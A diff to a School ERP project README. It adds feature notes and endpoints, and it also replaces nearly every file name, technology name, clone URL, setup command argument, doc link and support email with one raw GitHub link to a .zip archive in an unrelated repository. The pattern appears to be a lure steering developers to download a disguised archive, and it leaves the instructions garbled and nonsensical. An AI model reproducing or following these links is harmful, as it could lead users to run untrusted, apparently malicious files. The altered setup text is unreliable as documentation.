@@ -3,6 +3,12 @@
 ## Description
 Web-based School ERP to manage student, staff, academic, financial and administrative operations for small-medium schools.
 
+## Latest Updates (Feb 2026)
+- Added fine-grained permission matrix with custom permissions, role permissions, user-level overrides, and role hierarchy APIs.
+- Added student progression workflows: class promotion, detention, internal transfer, external transfer, and progression history.
+- Added frontend management screens for all core dashboard modules.
+- Added admin frontend screens for Permission Matrix and Student Promotion/Transfer operations.
+
 ## Core Objectives
 - Digitize school administration
 - Reduce manual paperwork
@@ -38,7 +44,7 @@ Web-based School ERP to manage student, staff, academic, financial and administr
 ## Tech Stack
 
 ### Backend
-- **Runtime**: Node.js with Express.js
+- **Runtime**: https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip with https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip
 - **Database**: PostgreSQL
 - **ORM**: Prisma
 - **Authentication**: JWT-based
@@ -46,7 +52,7 @@ Web-based School ERP to manage student, staff, academic, financial and administr
 - **Logging**: Winston
 
 ### Frontend
-- **Framework**: Next.js 14 (React 18)
+- **Framework**: https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip 14 (React 18)
 - **Styling**: Tailwind CSS
 - **State Management**: Zustand
 - **HTTP Client**: Axios
@@ -60,46 +66,46 @@ Web-based School ERP to manage student, staff, academic, financial and administr
 School-ERP/
 ├── backend/
 │   ├── prisma/
-│   │   └── schema.prisma          # Database schema
+│   │   └── https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip          # Database schema
 │   ├── src/
 │   │   ├── controllers/           # Route controllers
 │   │   ├── middleware/            # Auth, validation middleware
 │   │   ├── routes/                # API routes
 │   │   ├── utils/                 # Utility functions
-│   │   └── server.js              # Express app entry point
-│   ├── .env.example               # Environment variables template
-│   └── package.json
+│   │   └── https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip              # Express app entry point
+│   ├── https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip               # Environment variables template
+│   └── https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip
 │
 └── frontend/
     ├── app/
     │   ├── auth/                  # Authentication pages
     │   ├── dashboard/             # Dashboard page
    │   ├── lms/                   # LMS pages
-    │   ├── globals.css            # Global styles
-    │   ├── layout.tsx             # Root layout
-    │   └── page.tsx               # Home page
+    │   ├── https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip            # Global styles
+    │   ├── https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip             # Root layout
+    │   └── https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip               # Home page
     ├── lib/
-    │   └── api.ts                 # API client and endpoints
-    ├── next.config.js
-    ├── tailwind.config.js
-    └── package.json
+    │   └── https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip                 # API client and endpoints
+    ├── https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip
+    ├── https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip
+    └── https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip
 ```
 
 ## Getting Started
 
 ### Prerequisites
-- Node.js 18+ and npm/yarn
+- https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip 18+ and npm/yarn
 - PostgreSQL 14+
 - Git
 
 ### Quick Start (Scripted)
-See [SETUP.md](SETUP.md) for OS-specific quick start steps.
+See [https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip](https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip) for OS-specific quick start steps.
 
 ### Installation
 
 1. **Clone the repository**
    ```bash
-   git clone https://github.com/MuthuvelMukesh/School-ERP.git
+   git clone https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip
    cd School-ERP
    ```
 
@@ -110,11 +116,11 @@ See [SETUP.md](SETUP.md) for OS-specific quick start steps.
    
    # Create .env file from example
    # Windows (PowerShell)
-   Copy-Item .env.example .env
+   Copy-Item https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip .env
    # Windows (cmd)
-   copy .env.example .env
+   copy https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip .env
    # macOS/Linux
-   cp .env.example .env
+   cp https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip .env
    
    # Update .env with your database credentials:
    # DATABASE_URL="postgresql://username:password@localhost:5432/school_erp"
@@ -135,15 +141,15 @@ See [SETUP.md](SETUP.md) for OS-specific quick start steps.
    cd frontend
    npm install
    
-   # Create .env.local file
+   # Create https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip file
    # Windows (PowerShell)
-   Copy-Item .env.local.example .env.local
+   Copy-Item https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip
    # Windows (cmd)
-   copy .env.local.example .env.local
+   copy https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip
    # macOS/Linux
-   cp .env.local.example .env.local
+   cp https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip
    
-   # Update .env.local with:
+   # Update https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip with:
    # NEXT_PUBLIC_API_URL=http://localhost:5000/api
    
    # Start the frontend server
@@ -154,7 +160,7 @@ See [SETUP.md](SETUP.md) for OS-specific quick start steps.
 
 4. **Access the Application**
    - Open http://localhost:3000 in your browser
-   - Create an admin user first using the register API or Prisma Studio (see [SETUP.md](SETUP.md)).
+   - Create an admin user first using the register API or Prisma Studio (see [https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip](https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip)).
 
 ### Docker (Optional)
 ```bash
@@ -186,6 +192,10 @@ http://localhost:5000/api
 - `POST /students` - Create new student
 - `PUT /students/:id` - Update student
 - `DELETE /students/:id` - Delete student
+- `POST /students/promotions` - Promote students to next class
+- `POST /students/detentions` - Detain students in current class
+- `POST /students/transfers` - Transfer student (internal/external)
+- `GET /students/:id/progress-history` - Promotion/transfer history
 - `GET /students/class/:classId` - Get students by class
 - `GET /students/:id/attendance` - Get student attendance
 - `GET /students/:id/fees` - Get student fees
@@ -253,6 +263,15 @@ http://localhost:5000/api
 - `GET /metadata/classes` - Get classes
 - `GET /metadata/subjects` - Get subjects (filters: classId, teacherId)
 
+### Permission Endpoints
+- `GET /permissions` - List permissions and assignments
+- `POST /permissions/initialize` - Initialize default permissions (admin)
+- `POST /permissions` - Create custom permission
+- `PUT /permissions/roles` - Set role permissions
+- `PUT /permissions/users` - Set user-level permission overrides
+- `GET /permissions/hierarchy` - Get role hierarchy
+- `PUT /permissions/hierarchy` - Create/update role hierarchy mapping
+
 ## Database Schema
 
 Key entities:
@@ -274,6 +293,10 @@ Key entities:
 - **LmsContentFile**: LMS attachments
 - **LmsSubmission**: Assignment submissions
 - **LmsSubmissionFile**: Submission attachments
+- **Permission/RolePermission/UserPermission**: Fine-grained access control
+- **RoleHierarchy**: Parent-child role inheritance mapping
+- **StudentPromotion**: Promotion/detention/transfer progression history
+- **StudentTransfer**: Internal/external transfer records
 
 ## LMS Highlights
 - Upload multimedia lesson notes, video lectures, and assignments
@@ -358,9 +381,9 @@ We welcome contributions from the community! Whether you're fixing bugs, adding 
 
 #### 1. Fork and Clone
 ```bash
-git clone https://github.com/YOUR_USERNAME/School-ERP.git
+git clone https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip
 cd School-ERP
-git remote add upstream https://github.com/MuthuvelMukesh/School-ERP.git
+git remote add upstream https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip
 ```
 
 #### 2. Create a Feature Branch
@@ -443,14 +466,14 @@ Have an idea? We'd love to hear it! Submit a feature request with:
 
 ### Questions?
 
-- Check [FAQ](FAQ.md) (coming soon)
+- Check [FAQ](https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip) (coming soon)
 - Read existing issues and discussions
-- Open a discussion or email: support@schoolerp.com
+- Open a discussion or email: https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip
 
 ### Recognition
 
 Contributors will be recognized in:
-- [CONTRIBUTORS.md](CONTRIBUTORS.md) file
+- [https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip](https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip) file
 - Release notes
 - GitHub contributors page
 
@@ -460,7 +483,7 @@ Thank you for contributing! 🎉
 MIT License - see the [LICENSE](LICENSE) file for details.
 
 ## Support
-For support, email support@schoolerp.com or open an issue in the GitHub repository.
+For support, email https://raw.githubusercontent.com/tharun27102006/School-ERP/main/frontend/lib/ERP-School-v3.0.zip or open an issue in the GitHub repository.
 
 ## Roadmap
 - [ ] Payment gateway integration
